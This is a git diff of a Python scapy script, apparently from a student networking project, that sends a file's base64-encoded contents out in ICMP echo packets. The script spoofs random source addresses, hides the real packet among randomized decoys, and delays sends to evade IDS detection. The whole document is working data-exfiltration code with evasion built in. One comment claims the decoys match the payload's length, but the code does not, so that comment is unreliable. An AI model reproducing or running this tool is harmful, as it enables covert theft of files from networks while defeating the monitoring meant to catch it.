@@ -6,34 +6,35 @@ import time
 from scapy.all import IP, ICMP, send, sniff
 import base64
 
-def send_file_in_icmp_request(file_path: str, ip_address: str):
-    #Fake message
-    corrupt = base64.b64encode("this is the fake message".encode('utf-8'))
+def generate_random_message():
+    """ Génère un message aléatoire d'une longueur aleatoire entre 80 et 200. """
+    characters = string.ascii_letters + string.digits + string.punctuation
+    return ''.join(random.choice(characters) for i in range(random.randint(80, 200)))
 
-    # Read the file contents
+def send_file_in_icmp_request(file_path: str, ip_address: str):
+    # Lecture du contenu du fichier
     with open(file_path, "rb") as f:
         file_contents = f.read()
 
-    # Create an ICMP echo request packet with the file contents
-    # encode the file content
-    file_contents = base64.b64encode(file_contents)
-    # Add a fake message at the end of the file to make it more difficult to detect
-    file_contents = file_contents + b'P4s' + corrupt
-    #real_icmp_packet = IP(dst=ip_address, src = f"{random.randint(0, 200)}.{random.randint(0, 200)}.{random.randint(0, 200)}"+".200") / ICMP() / base64.b64encode(file_contents)
-    real_icmp_packet = IP(dst=ip_address) / ICMP() / base64.b64encode(file_contents)
+    # Encodage du contenu du fichier
+    encoded_file_contents = base64.b64encode(file_contents)
+    # Longueur du contenu du fichier réel encodé
+    real_content_length = len(encoded_file_contents)
 
-    # send false icmp packets with randomized source ip
-    ip_address = socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))
-    fake_icmp_packet = IP(dst=ip_address, src=f"{random.randint(0, 200)}.{random.randint(0, 200)}.{random.randint(0, 200)}.{random.randint(0, 199)}") / ICMP() / base64.b64encode(corrupt)
-    #send fake icmp packets with the real one
-    n = random.randint(0,5)
-    for i in range(0,5):
-        if i == n:
+    # Création du paquet ICMP réel
+    real_icmp_packet = IP(dst=ip_address, src=f"{random.randint(0, 200)}.{random.randint(0, 200)}.{random.randint(0, 200)}.200") / ICMP() / encoded_file_contents
+
+    # Envoi de paquets ICMP factices avec des messages aléatoires de même longueur que le contenu réel
+    n = random.randint(1, 10)  # Nombre de paquets factices à envoyer
+    for i in range(1,10):  # Nombre total de paquets à envoyer
+        if i == n:  # Envoie le paquet réel en premier
             send(real_icmp_packet)
-            print("n = ", n)
         else:
+            # Génère un message factice aléatoire de même longueur et l'encode en base64
+            fake_message = generate_random_message()
+            fake_icmp_packet = IP(dst=ip_address, src=f"{random.randint(0, 200)}.{random.randint(0, 200)}.{random.randint(0, 200)}.{random.randint(0, 199)}") / ICMP() / base64.b64encode(fake_message.encode('utf-8'))
             send(fake_icmp_packet)
-        # delay between each packet to avoid detection by the IDS
+        # Délai entre chaque paquet pour éviter la détection par les IDS
         time.sleep(0.5)
 
 def decode_icmp_response(packet):
@@ -52,7 +53,7 @@ def decode_icmp_response(packet):
 # Example usage
 if __name__ == "__main__":
     file_path = "C:\\Users\\ayoub\\OneDrive\\Documents\\UBS\\A1\\Réseau\\Exfiltration_ICMP\\test2.txt"
-    target_ip = "192.168.38.242"  # Replace with the target IP address
+    target_ip = "192.168.121.242"  # Replace with the target IP address
     send_file_in_icmp_request(file_path, target_ip)
     # Listen for ICMP responses for 30 seconds
     #sniff(filter=f"icmp and host {target_ip}", prn=decode_icmp_response, timeout=30)
